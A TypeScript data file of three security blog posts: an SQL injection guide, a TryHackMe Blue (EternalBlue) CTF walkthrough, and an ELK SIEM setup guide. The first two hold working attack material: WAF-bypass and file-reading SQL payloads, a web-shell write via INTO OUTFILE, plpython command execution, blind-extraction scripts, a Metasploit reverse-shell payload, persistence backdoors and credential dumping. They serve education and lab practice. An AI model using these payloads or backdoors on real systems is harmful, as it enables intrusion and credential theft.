export interface BlogContent {
  id: number;
  title: string;
  excerpt: string;
  image: string;
  tags: string[];
  date: string;
  readTime: string;
  content: string;
}

export const blogContent: BlogContent[] = [
  {
    id: 1,
    title: "Advanced SQL Injection Techniques in Modern Web Applications",
    excerpt: "Exploring sophisticated SQL injection methods and how to defend against them in contemporary web environments.",
    image: "https://images.pexels.com/photos/1181298/pexels-photo-1181298.jpeg?auto=compress&cs=tinysrgb&w=800",
    tags: ["Red Teaming", "Scripting"],
    date: "2024-01-15",
    readTime: "8 min",
    content: `
# Introduction

SQL injection remains one of the most critical vulnerabilities in web applications, consistently ranking in the OWASP Top 10. Despite decades of awareness, modern applications continue to fall victim to sophisticated injection techniques that bypass traditional security measures.

In this comprehensive guide, we'll explore advanced SQL injection methods that penetration testers and security researchers encounter in contemporary web environments.

## Understanding Modern SQL Injection Landscape

Traditional SQL injection techniques often fail against modern applications due to:

- **Web Application Firewalls (WAFs)** that filter malicious payloads
- **Parameterized queries** and prepared statements
- **Input validation** and sanitization mechanisms
- **Database-level security controls**

However, sophisticated attackers have developed techniques to bypass these protections.

## Advanced Bypass Techniques

### 1. WAF Evasion Through Encoding

Modern WAFs can be bypassed using various encoding techniques:

\`\`\`sql
-- URL encoding
%27%20UNION%20SELECT%20NULL--

-- Double URL encoding  
%2527%2520UNION%2520SELECT%2520NULL--

-- Unicode encoding
\u0027 UNION SELECT NULL--

-- HTML entity encoding
&#x27; UNION SELECT NULL--
\`\`\`

### 2. Time-Based Blind SQL Injection

When traditional error-based injection fails, time-based techniques prove effective:

\`\`\`python
import requests
import time

def time_based_sqli(url, payload):
    start_time = time.time()
    response = requests.get(url + payload)
    end_time = time.time()
    
    return (end_time - start_time) > 5  # 5 second delay indicates success

# Example payload
payload = "' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--"
\`\`\`

### 3. Second-Order SQL Injection

This sophisticated technique involves injecting malicious SQL that gets stored and executed later:

\`\`\`sql
-- First request: Store malicious payload
INSERT INTO users (username, email) VALUES ('admin', 'test@example.com'' UNION SELECT password FROM admin_users--');

-- Second request: Trigger execution
SELECT * FROM users WHERE email = 'test@example.com'' UNION SELECT password FROM admin_users--';
\`\`\`

## Database-Specific Techniques

### MySQL Advanced Techniques

MySQL offers unique functions for advanced exploitation:

\`\`\`sql
-- Information extraction using LOAD_FILE
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Writing files to disk
' UNION SELECT 'malicious content' INTO OUTFILE '/var/www/html/shell.php'--

-- Using MySQL-specific functions
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
\`\`\`

### PostgreSQL Exploitation

PostgreSQL provides powerful features for post-exploitation:

\`\`\`sql
-- Command execution through extensions
'; CREATE EXTENSION IF NOT EXISTS plpython3u; CREATE OR REPLACE FUNCTION exec(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd, shell=True).decode() $$ LANGUAGE plpython3u;--

-- Reading files
'; SELECT pg_read_file('/etc/passwd', 0, 1000000);--
\`\`\`

## Automated Detection and Exploitation

### Custom SQLMap Techniques

SQLMap can be enhanced with custom payloads and techniques:

\`\`\`bash
# Custom payload file
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode --level=5 --risk=3

# Using custom injection points
sqlmap -r request.txt --batch --dbs --tamper=between,randomcase
\`\`\`

### Python Automation Script

\`\`\`python
import requests
import string
import time

class AdvancedSQLInjector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def blind_boolean_injection(self, query):
        """Boolean-based blind SQL injection"""
        payload = f"' AND ({query})--"
        response = self.session.get(self.target_url + payload)
        return "Welcome" in response.text
    
    def extract_database_name(self):
        """Extract database name character by character"""
        db_name = ""
        for position in range(1, 50):
            for char in string.ascii_letters + string.digits + "_":
                query = f"SUBSTRING(DATABASE(),{position},1)='{char}'"
                if self.blind_boolean_injection(query):
                    db_name += char
                    print(f"Database name so far: {db_name}")
                    break
            else:
                break
        return db_name

# Usage
injector = AdvancedSQLInjector("http://vulnerable-site.com/search.php?q=")
database_name = injector.extract_database_name()
\`\`\`

## Defense Strategies

### 1. Parameterized Queries

Always use parameterized queries or prepared statements:

\`\`\`python
# Vulnerable code
query = f"SELECT * FROM users WHERE username = '{username}'"

# Secure code
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
\`\`\`

### 2. Input Validation and Sanitization

Implement comprehensive input validation:

\`\`\`python
import re

def validate_input(user_input):
    # Allow only alphanumeric characters and specific symbols
    pattern = r'^[a-zA-Z0-9@._-]+$'
    return re.match(pattern, user_input) is not None

def sanitize_input(user_input):
    # Remove or escape dangerous characters
    dangerous_chars = ["'", '"', ";", "--", "/*", "*/", "xp_", "sp_"]
    for char in dangerous_chars:
        user_input = user_input.replace(char, "")
    return user_input
\`\`\`

### 3. Database Security Hardening

- **Principle of least privilege**: Grant minimal necessary permissions
- **Database user separation**: Use different users for different application functions
- **Regular security updates**: Keep database software updated
- **Network segmentation**: Isolate database servers

## Real-World Case Study

During a recent penetration test, I encountered a financial application that appeared secure against standard SQL injection techniques. The application used:

- Parameterized queries for most operations
- A robust WAF filtering common payloads
- Input validation on the client side

However, through careful analysis, I discovered a second-order SQL injection vulnerability in the user profile update functionality. The application properly sanitized input during registration but failed to re-sanitize stored data when displaying user profiles.

**The exploitation process:**

1. **Registration**: Injected payload in the "company" field
2. **Profile Update**: Triggered the stored payload execution
3. **Data Extraction**: Used time-based techniques to extract sensitive data

This case highlights the importance of comprehensive security testing beyond obvious injection points.

## Conclusion

Advanced SQL injection techniques continue to evolve as applications implement stronger security measures. Security professionals must stay updated with the latest attack vectors and bypass techniques to effectively protect their applications.

**Key takeaways:**

- Traditional defenses may not be sufficient against sophisticated attacks
- Second-order and time-based injections can bypass many security controls
- Comprehensive input validation and parameterized queries remain essential
- Regular security testing should include advanced injection techniques

The cybersecurity landscape is constantly evolving, and staying ahead of attackers requires continuous learning and adaptation of both offensive and defensive techniques.

---

*Remember: This information is provided for educational and defensive purposes only. Always ensure you have proper authorization before testing any systems.*
    `
  },
  {
    id: 2,
    title: "CTF Writeup: TryHackMe Blue Room",
    excerpt: "Complete walkthrough of the Blue room on TryHackMe, covering Windows exploitation and privilege escalation.",
    image: "https://images.pexels.com/photos/2004161/pexels-photo-2004161.jpeg?auto=compress&cs=tinysrgb&w=800",
    tags: ["CTF", "Red Teaming"],
    date: "2024-01-10",
    readTime: "12 min",
    content: `
# TryHackMe Blue Room - Complete Walkthrough

The **Blue** room on TryHackMe is an excellent beginner-friendly Windows exploitation challenge that focuses on the infamous **EternalBlue** vulnerability (MS17-010). This writeup provides a comprehensive walkthrough of the exploitation process.

## Room Overview

- **Difficulty**: Easy
- **Target OS**: Windows 7
- **Primary Vulnerability**: MS17-010 (EternalBlue)
- **Skills Learned**: Windows exploitation, Metasploit usage, privilege escalation

## Initial Reconnaissance

### Network Scanning

Let's start with a comprehensive Nmap scan to identify open ports and services:

\`\`\`bash
# Initial port scan
nmap -sC -sV -oN initial_scan.txt <TARGET_IP>

# Full port scan
nmap -p- -T4 -oN full_scan.txt <TARGET_IP>
\`\`\`

**Results:**
\`\`\`
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
\`\`\`

### SMB Enumeration

The presence of SMB (port 445) on a Windows 7 system immediately suggests potential EternalBlue vulnerability:

\`\`\`bash
# SMB version detection
smbclient -L //<TARGET_IP> -N

# Check for SMB vulnerabilities
nmap --script smb-vuln* -p 445 <TARGET_IP>
\`\`\`

**Key findings:**
- Windows 7 Professional (Build 7601)
- SMB service running on port 445
- System appears vulnerable to MS17-010

## Vulnerability Analysis

### MS17-010 (EternalBlue) Overview

EternalBlue is a critical vulnerability in Microsoft's SMBv1 protocol that allows remote code execution. Key characteristics:

- **CVE**: CVE-2017-0144
- **CVSS Score**: 8.1 (High)
- **Affected Systems**: Windows Vista, 7, 8.1, 10, Server 2008/2012/2016
- **Attack Vector**: Network-based, no authentication required

### Vulnerability Verification

\`\`\`bash
# Using Nmap script to confirm vulnerability
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
\`\`\`

**Output:**
\`\`\`
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
\`\`\`

## Exploitation Phase

### Method 1: Metasploit Framework

Launch Metasploit and configure the exploit:

\`\`\`bash
msfconsole

# Search for EternalBlue exploits
search ms17-010

# Use the exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set target
set RHOSTS <TARGET_IP>

# Set payload
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444

# Check options
show options

# Execute exploit
exploit
\`\`\`

### Method 2: Manual Exploitation

For educational purposes, let's also explore manual exploitation:

\`\`\`python
#!/usr/bin/env python
# EternalBlue exploit script (simplified version)

import socket
import struct

def create_smb_header(command):
    """Create SMB header"""
    header = b"\\xff\\x53\\x4d\\x42"  # SMB signature
    header += struct.pack("<B", command)  # Command
    header += b"\\x00" * 31  # Remaining header fields
    return header

def exploit_eternalblue(target_ip):
    """Exploit EternalBlue vulnerability"""
    try:
        # Create socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, 445))
        
        # Send malicious SMB packet
        # (This is a simplified example - real exploit is much more complex)
        malicious_packet = create_smb_header(0x72)  # SMB_COM_NEGOTIATE
        sock.send(malicious_packet)
        
        response = sock.recv(1024)
        print(f"Response: {response}")
        
        sock.close()
        
    except Exception as e:
        print(f"Exploitation failed: {e}")

# Usage
exploit_eternalblue("<TARGET_IP>")
\`\`\`

## Post-Exploitation

### Meterpreter Session

Once we have a Meterpreter session, let's gather system information:

\`\`\`bash
# Check current user
getuid

# System information
sysinfo

# List processes
ps

# Check privileges
getprivs
\`\`\`

**Output:**
\`\`\`
meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM

meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
\`\`\`

### Flag Hunting

The room typically has flags hidden in various locations:

\`\`\`bash
# Search for flag files
search -f flag*.txt

# Navigate to common locations
cd C:\\Users
dir
cd Jon\\Desktop
type flag1.txt

cd C:\\Windows\\System32\\config
type flag2.txt

cd C:\\Users\\Jon\\Documents
type flag3.txt
\`\`\`

### Persistence Mechanisms

For educational purposes, let's explore persistence techniques:

\`\`\`bash
# Create persistent backdoor
run persistence -S -U -X -i 10 -p 4445 -r <YOUR_IP>

# Registry persistence
reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\Windows\\System32\\backdoor.exe"

# Service persistence
upload backdoor.exe C:\\Windows\\System32\\
sc create "Windows Update Service" binpath= "C:\\Windows\\System32\\backdoor.exe" start= auto
\`\`\`

## Advanced Techniques

### Memory Dumping

Extract password hashes from memory:

\`\`\`bash
# Load mimikatz
load kiwi

# Dump credentials
creds_all

# Dump SAM database
hashdump
\`\`\`

### Network Pivoting

Use the compromised system as a pivot point:

\`\`\`bash
# Add route for internal network
route add 192.168.1.0 255.255.255.0 1

# Port forwarding
portfwd add -l 8080 -p 80 -r 192.168.1.10

# SOCKS proxy
auxiliary/server/socks4a
\`\`\`

## Detection and Mitigation

### Detection Methods

Organizations can detect EternalBlue attacks through:

\`\`\`bash
# Windows Event Log monitoring
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625,4624}

# Network monitoring with Wireshark
# Look for SMB traffic anomalies on port 445

# YARA rules for EternalBlue detection
rule EternalBlue_Exploit {
    strings:
        $smb_header = { FF 53 4D 42 }
        $eternal_blue = "\\x00\\x00\\x00\\x31\\x00\\x02\\x00"
    condition:
        $smb_header and $eternal_blue
}
\`\`\`

### Mitigation Strategies

1. **Patch Management**
   \`\`\`powershell
   # Install MS17-010 patch
   Get-HotFix -Id KB4013389
   \`\`\`

2. **Disable SMBv1**
   \`\`\`powershell
   # Disable SMBv1 protocol
   Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
   \`\`\`

3. **Network Segmentation**
   - Block SMB traffic (ports 139, 445) at network perimeter
   - Implement internal network segmentation
   - Use host-based firewalls

4. **Monitoring and Detection**
   - Deploy EDR solutions
   - Monitor SMB traffic for anomalies
   - Implement network intrusion detection systems

## Lessons Learned

### Key Takeaways

1. **Patch Management is Critical**: Unpatched systems remain vulnerable to well-known exploits
2. **Network Segmentation**: Proper segmentation can limit attack spread
3. **Legacy Protocol Risks**: SMBv1 should be disabled in modern environments
4. **Monitoring Importance**: Proper logging and monitoring can detect attacks early

### Real-World Impact

The EternalBlue vulnerability has been used in several major attacks:

- **WannaCry Ransomware (2017)**: Infected over 300,000 computers worldwide
- **NotPetya (2017)**: Caused billions in damages to global organizations
- **Various APT Groups**: Continued use in targeted attacks

## Conclusion

The TryHackMe Blue room provides an excellent introduction to Windows exploitation techniques. The EternalBlue vulnerability demonstrates how a single unpatched system can lead to complete compromise.

**Skills Developed:**
- Network reconnaissance and enumeration
- Vulnerability identification and verification
- Metasploit framework usage
- Post-exploitation techniques
- Windows privilege escalation

This exercise reinforces the importance of:
- Regular security patching
- Network monitoring and detection
- Defense-in-depth strategies
- Incident response preparedness

---

*Remember: Always practice ethical hacking in controlled environments and with proper authorization. The techniques described here should only be used for educational purposes and authorized penetration testing.*
    `
  },
  {
    id: 3,
    title: "Building a SIEM with ELK Stack for Threat Detection",
    excerpt: "Step-by-step guide to setting up a Security Information and Event Management system using the ELK stack.",
    image: "https://images.pexels.com/photos/1181677/pexels-photo-1181677.jpeg?auto=compress&cs=tinysrgb&w=800",
    tags: ["DFIR", "Scripting"],
    date: "2024-01-05",
    readTime: "15 min",
    content: `
# Building a SIEM with ELK Stack for Threat Detection

Security Information and Event Management (SIEM) systems are crucial for modern cybersecurity operations. In this comprehensive guide, we'll build a production-ready SIEM using the ELK Stack (Elasticsearch, Logstash, and Kibana) with advanced threat detection capabilities.

## Architecture Overview

Our SIEM architecture will include:

- **Elasticsearch**: Data storage and search engine
- **Logstash**: Data processing and enrichment pipeline  
- **Kibana**: Visualization and dashboard interface
- **Beats**: Lightweight data shippers
- **Custom Detection Rules**: Threat hunting and alerting

## Prerequisites and Setup

### System Requirements

\`\`\`bash
# Minimum hardware requirements
CPU: 4 cores
RAM: 16GB (32GB recommended)
Storage: 500GB SSD (1TB+ for production)
OS: Ubuntu 20.04 LTS or CentOS 8
\`\`\`

### Initial System Configuration

\`\`\`bash
# Update system packages
sudo apt update && sudo apt upgrade -y

# Install Java (required for Elasticsearch and Logstash)
sudo apt install openjdk-11-jdk -y

# Verify Java installation
java -version

# Configure system limits
echo "elasticsearch soft memlock unlimited" | sudo tee -a /etc/security/limits.conf
echo "elasticsearch hard memlock unlimited" | sudo tee -a /etc/security/limits.conf

# Configure virtual memory
echo "vm.max_map_count=262144" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
\`\`\`

## Elasticsearch Installation and Configuration

### Installation

\`\`\`bash
# Add Elasticsearch repository
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
echo "deb https://artifacts.elastic.co/packages/7.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-7.x.list

# Install Elasticsearch
sudo apt update
sudo apt install elasticsearch -y

# Enable and start service
sudo systemctl enable elasticsearch
sudo systemctl start elasticsearch
\`\`\`

### Configuration

\`\`\`yaml
# /etc/elasticsearch/elasticsearch.yml
cluster.name: siem-cluster
node.name: siem-node-1
path.data: /var/lib/elasticsearch
path.logs: /var/log/elasticsearch
network.host: 0.0.0.0
http.port: 9200
discovery.type: single-node

# Security settings
xpack.security.enabled: true
xpack.security.transport.ssl.enabled: true
xpack.security.http.ssl.enabled: true

# Memory settings
bootstrap.memory_lock: true
\`\`\`

### Index Templates for Security Data

\`\`\`json
{
  "index_patterns": ["security-logs-*"],
  "template": {
    "settings": {
      "number_of_shards": 1,
      "number_of_replicas": 1,
      "index.refresh_interval": "5s"
    },
    "mappings": {
      "properties": {
        "@timestamp": {"type": "date"},
        "source_ip": {"type": "ip"},
        "destination_ip": {"type": "ip"},
        "event_type": {"type": "keyword"},
        "severity": {"type": "keyword"},
        "message": {"type": "text"},
        "user": {"type": "keyword"},
        "host": {"type": "keyword"},
        "process": {"type": "keyword"},
        "command_line": {"type": "text"},
        "file_path": {"type": "keyword"},
        "hash": {"type": "keyword"}
      }
    }
  }
}
\`\`\`

## Logstash Configuration

### Installation

\`\`\`bash
# Install Logstash
sudo apt install logstash -y

# Enable and start service
sudo systemctl enable logstash
sudo systemctl start logstash
\`\`\`

### Pipeline Configuration

\`\`\`ruby
# /etc/logstash/conf.d/security-pipeline.conf
input {
  beats {
    port => 5044
  }
  
  syslog {
    port => 514
    type => "syslog"
  }
  
  tcp {
    port => 5000
    type => "json"
    codec => json_lines
  }
}

filter {
  # Parse Windows Event Logs
  if [winlog][event_id] {
    mutate {
      add_field => { "event_type" => "windows_event" }
    }
    
    # Detect suspicious logon events
    if [winlog][event_id] == 4625 {
      mutate {
        add_field => { "alert_type" => "failed_logon" }
        add_field => { "severity" => "medium" }
      }
    }
    
    # Detect privilege escalation
    if [winlog][event_id] == 4672 {
      mutate {
        add_field => { "alert_type" => "privilege_escalation" }
        add_field => { "severity" => "high" }
      }
    }
  }
  
  # Parse Linux system logs
  if [type] == "syslog" {
    grok {
      match => { 
        "message" => "%{SYSLOGTIMESTAMP:timestamp} %{IPORHOST:host} %{PROG:program}(?:\\[%{POSINT:pid}\\])?: %{GREEDYDATA:message}" 
      }
    }
    
    # Detect SSH brute force attempts
    if [program] == "sshd" and [message] =~ /Failed password/ {
      mutate {
        add_field => { "alert_type" => "ssh_brute_force" }
        add_field => { "severity" => "high" }
      }
      
      grok {
        match => { 
          "message" => "Failed password for %{USERNAME:failed_user} from %{IP:source_ip}" 
        }
      }
    }
  }
  
  # GeoIP enrichment
  if [source_ip] {
    geoip {
      source => "source_ip"
      target => "geoip"
    }
  }
  
  # Threat intelligence enrichment
  if [source_ip] {
    translate {
      source => "source_ip"
      target => "threat_intel"
      dictionary_path => "/etc/logstash/threat_intel.yml"
      fallback => "clean"
    }
  }
  
  # Add timestamp
  date {
    match => [ "timestamp", "MMM dd HH:mm:ss", "MMM  d HH:mm:ss" ]
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "security-logs-%{+YYYY.MM.dd}"
    template_name => "security-logs"
  }
  
  # Send high-severity alerts to separate index
  if [severity] == "high" {
    elasticsearch {
      hosts => ["localhost:9200"]
      index => "security-alerts-%{+YYYY.MM.dd}"
    }
  }
  
  # Debug output
  stdout { 
    codec => rubydebug 
  }
}
\`\`\`

### Threat Intelligence Integration

\`\`\`yaml
# /etc/logstash/threat_intel.yml
# Known malicious IPs (example)
"192.168.1.100": "malicious"
"10.0.0.50": "suspicious"
"203.0.113.1": "tor_exit_node"
\`\`\`

## Kibana Setup and Dashboards

### Installation

\`\`\`bash
# Install Kibana
sudo apt install kibana -y

# Configure Kibana
sudo nano /etc/kibana/kibana.yml
\`\`\`

### Configuration

\`\`\`yaml
# /etc/kibana/kibana.yml
server.port: 5601
server.host: "0.0.0.0"
elasticsearch.hosts: ["http://localhost:9200"]
kibana.index: ".kibana"

# Security settings
xpack.security.enabled: true
xpack.encryptedSavedObjects.encryptionKey: "your-32-character-encryption-key"
\`\`\`

### Security Dashboard Creation

\`\`\`json
{
  "version": "7.15.0",
  "objects": [
    {
      "id": "security-overview",
      "type": "dashboard",
      "attributes": {
        "title": "Security Overview Dashboard",
        "hits": 0,
        "description": "Main security monitoring dashboard",
        "panelsJSON": "[{\"version\":\"7.15.0\",\"gridData\":{\"x\":0,\"y\":0,\"w\":24,\"h\":15,\"i\":\"1\"},\"panelIndex\":\"1\",\"embeddableConfig\":{},\"panelRefName\":\"panel_1\"}]",
        "timeRestore": false,
        "timeTo": "now",
        "timeFrom": "now-24h",
        "refreshInterval": {
          "pause": false,
          "value": 30000
        }
      }
    }
  ]
}
\`\`\`

## Beats Configuration

### Winlogbeat for Windows Systems

\`\`\`yaml
# winlogbeat.yml
winlogbeat.event_logs:
  - name: Application
    ignore_older: 72h
  - name: System
    ignore_older: 72h
  - name: Security
    ignore_older: 72h
  - name: Microsoft-Windows-Sysmon/Operational
    ignore_older: 72h

output.logstash:
  hosts: ["siem-server:5044"]

processors:
  - add_host_metadata:
      when.not.contains.tags: forwarded
  - add_docker_metadata: ~
  - add_kubernetes_metadata: ~

logging.level: info
logging.to_files: true
logging.files:
  path: C:\\ProgramData\\Elastic\\Beats\\winlogbeat\\Logs
  name: winlogbeat
  keepfiles: 7
  permissions: 0644
\`\`\`

### Filebeat for Linux Systems

\`\`\`yaml
# filebeat.yml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/auth.log
    - /var/log/syslog
    - /var/log/apache2/*.log
    - /var/log/nginx/*.log
  fields:
    logtype: system
  fields_under_root: true

- type: log
  enabled: true
  paths:
    - /var/log/suricata/eve.json
  json.keys_under_root: true
  json.add_error_key: true
  fields:
    logtype: suricata

output.logstash:
  hosts: ["localhost:5044"]

processors:
  - add_host_metadata:
      when.not.contains.tags: forwarded
\`\`\`

## Advanced Detection Rules

### Custom Detection Scripts

\`\`\`python
#!/usr/bin/env python3
# advanced_detection.py

import json
import requests
from datetime import datetime, timedelta
import smtplib
from email.mime.text import MIMEText

class SIEMDetector:
    def __init__(self, elasticsearch_url):
        self.es_url = elasticsearch_url
        self.alerts = []
    
    def detect_brute_force(self, threshold=10, time_window=300):
        """Detect brute force attacks"""
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"alert_type": "failed_logon"}},
                        {"range": {"@timestamp": {
                            "gte": "now-{}s".format(time_window)
                        }}}
                    ]
                }
            },
            "aggs": {
                "by_source_ip": {
                    "terms": {"field": "source_ip", "size": 100},
                    "aggs": {
                        "failed_attempts": {"value_count": {"field": "source_ip"}}
                    }
                }
            }
        }
        
        response = requests.post(
            f"{self.es_url}/security-logs-*/_search",
            json=query,
            headers={"Content-Type": "application/json"}
        )
        
        results = response.json()
        
        for bucket in results['aggregations']['by_source_ip']['buckets']:
            if bucket['doc_count'] >= threshold:
                alert = {
                    "type": "brute_force_detected",
                    "source_ip": bucket['key'],
                    "attempts": bucket['doc_count'],
                    "timestamp": datetime.now().isoformat(),
                    "severity": "high"
                }
                self.alerts.append(alert)
                self.send_alert(alert)
    
    def detect_lateral_movement(self):
        """Detect potential lateral movement"""
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"event_type": "network_connection"}},
                        {"range": {"@timestamp": {"gte": "now-1h"}}}
                    ]
                }
            },
            "aggs": {
                "by_source": {
                    "terms": {"field": "source_ip"},
                    "aggs": {
                        "unique_destinations": {
                            "cardinality": {"field": "destination_ip"}
                        }
                    }
                }
            }
        }
        
        response = requests.post(
            f"{self.es_url}/security-logs-*/_search",
            json=query
        )
        
        results = response.json()
        
        for bucket in results['aggregations']['by_source']['buckets']:
            if bucket['unique_destinations']['value'] > 20:  # Threshold
                alert = {
                    "type": "lateral_movement_suspected",
                    "source_ip": bucket['key'],
                    "unique_destinations": bucket['unique_destinations']['value'],
                    "timestamp": datetime.now().isoformat(),
                    "severity": "medium"
                }
                self.alerts.append(alert)
    
    def detect_data_exfiltration(self):
        """Detect potential data exfiltration"""
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"range": {"bytes_out": {"gte": 100000000}}},  # 100MB+
                        {"range": {"@timestamp": {"gte": "now-1h"}}}
                    ]
                }
            },
            "aggs": {
                "by_user": {
                    "terms": {"field": "user.keyword"},
                    "aggs": {
                        "total_bytes": {"sum": {"field": "bytes_out"}}
                    }
                }
            }
        }
        
        response = requests.post(
            f"{self.es_url}/security-logs-*/_search",
            json=query
        )
        
        results = response.json()
        
        for bucket in results['aggregations']['by_user']['buckets']:
            if bucket['total_bytes']['value'] > 1000000000:  # 1GB threshold
                alert = {
                    "type": "data_exfiltration_suspected",
                    "user": bucket['key'],
                    "bytes_transferred": bucket['total_bytes']['value'],
                    "timestamp": datetime.now().isoformat(),
                    "severity": "critical"
                }
                self.alerts.append(alert)
                self.send_alert(alert)
    
    def send_alert(self, alert):
        """Send alert notification"""
        # Email notification
        msg = MIMEText(json.dumps(alert, indent=2))
        msg['Subject'] = f"SIEM Alert: {alert['type']}"
        msg['From'] = "siem@company.com"
        msg['To'] = "security-team@company.com"
        
        # Send email (configure SMTP settings)
        # smtp_server.send_message(msg)
        
        # Log to file
        with open('/var/log/siem-alerts.log', 'a') as f:
            f.write(json.dumps(alert) + '\\n')
        
        print(f"Alert generated: {alert['type']}")

# Usage
if __name__ == "__main__":
    detector = SIEMDetector("http://localhost:9200")
    
    # Run detection rules
    detector.detect_brute_force()
    detector.detect_lateral_movement()
    detector.detect_data_exfiltration()
    
    print(f"Generated {len(detector.alerts)} alerts")
\`\`\`

### Automated Response Scripts

\`\`\`bash
#!/bin/bash
# incident_response.sh

ALERT_TYPE=$1
SOURCE_IP=$2
SEVERITY=$3

case $ALERT_TYPE in
    "brute_force_detected")
        echo "Blocking IP: $SOURCE_IP"
        # Block IP using iptables
        iptables -A INPUT -s $SOURCE_IP -j DROP
        
        # Add to fail2ban
        fail2ban-client set sshd banip $SOURCE_IP
        
        # Log action
        echo "$(date): Blocked $SOURCE_IP for brute force attack" >> /var/log/incident-response.log
        ;;
        
    "lateral_movement_suspected")
        echo "Investigating lateral movement from: $SOURCE_IP"
        # Increase monitoring for this IP
        # Generate detailed network flow report
        ;;
        
    "data_exfiltration_suspected")
        echo "CRITICAL: Data exfiltration detected from: $SOURCE_IP"
        # Immediate network isolation
        # Alert security team
        # Preserve evidence
        ;;
esac
\`\`\`

## Performance Optimization

### Elasticsearch Tuning

\`\`\`yaml
# elasticsearch.yml optimizations
indices.memory.index_buffer_size: 30%
indices.memory.min_index_buffer_size: 96mb
indices.fielddata.cache.size: 40%
indices.queries.cache.size: 10%
indices.requests.cache.size: 2%

# JVM heap settings
# /etc/elasticsearch/jvm.options
-Xms16g
-Xmx16g
\`\`\`

### Index Lifecycle Management

\`\`\`json
{
  "policy": {
    "phases": {
      "hot": {
        "actions": {
          "rollover": {
            "max_size": "10GB",
            "max_age": "1d"
          }
        }
      },
      "warm": {
        "min_age": "7d",
        "actions": {
          "allocate": {
            "number_of_replicas": 0
          }
        }
      },
      "cold": {
        "min_age": "30d",
        "actions": {
          "allocate": {
            "number_of_replicas": 0
          }
        }
      },
      "delete": {
        "min_age": "90d"
      }
    }
  }
}
\`\`\`

## Monitoring and Maintenance

### Health Check Script

\`\`\`python
#!/usr/bin/env python3
# siem_health_check.py

import requests
import json
import sys
from datetime import datetime

def check_elasticsearch():
    """Check Elasticsearch cluster health"""
    try:
        response = requests.get("http://localhost:9200/_cluster/health")
        health = response.json()
        
        if health['status'] == 'green':
            print("✓ Elasticsearch: Healthy")
            return True
        else:
            print(f"✗ Elasticsearch: {health['status']}")
            return False
    except Exception as e:
        print(f"✗ Elasticsearch: Connection failed - {e}")
        return False

def check_logstash():
    """Check Logstash pipeline health"""
    try:
        response = requests.get("http://localhost:9600/_node/stats")
        stats = response.json()
        
        if stats['pipeline']['events']['in'] > 0:
            print("✓ Logstash: Processing events")
            return True
        else:
            print("✗ Logstash: No events processed")
            return False
    except Exception as e:
        print(f"✗ Logstash: Connection failed - {e}")
        return False

def check_kibana():
    """Check Kibana availability"""
    try:
        response = requests.get("http://localhost:5601/api/status")
        if response.status_code == 200:
            print("✓ Kibana: Available")
            return True
        else:
            print("✗ Kibana: Unavailable")
            return False
    except Exception as e:
        print(f"✗ Kibana: Connection failed - {e}")
        return False

def main():
    print(f"SIEM Health Check - {datetime.now()}")
    print("=" * 40)
    
    checks = [
        check_elasticsearch(),
        check_logstash(),
        check_kibana()
    ]
    
    if all(checks):
        print("\\n✓ All systems operational")
        sys.exit(0)
    else:
        print("\\n✗ Some systems require attention")
        sys.exit(1)

if __name__ == "__main__":
    main()
\`\`\`

## Conclusion

Building a SIEM with the ELK Stack provides organizations with powerful security monitoring capabilities. This implementation offers:

**Key Benefits:**
- **Real-time threat detection** with custom rules
- **Centralized log management** from multiple sources
- **Advanced analytics** and visualization
- **Automated incident response** capabilities
- **Scalable architecture** for growing environments

**Best Practices Implemented:**
- Proper index lifecycle management
- Performance optimization
- Automated health monitoring
- Threat intelligence integration
- Custom detection rules

**Next Steps:**
- Implement machine learning-based anomaly detection
- Add SOAR (Security Orchestration, Automation, and Response) capabilities
- Integrate with external threat intelligence feeds
- Develop custom Kibana plugins for specialized visualizations

This SIEM solution provides a solid foundation for security operations centers and can be extended based on specific organizational requirements.

---

*Remember to regularly update your SIEM components, review detection rules, and tune performance based on your environment's specific needs.*
    `
  }
];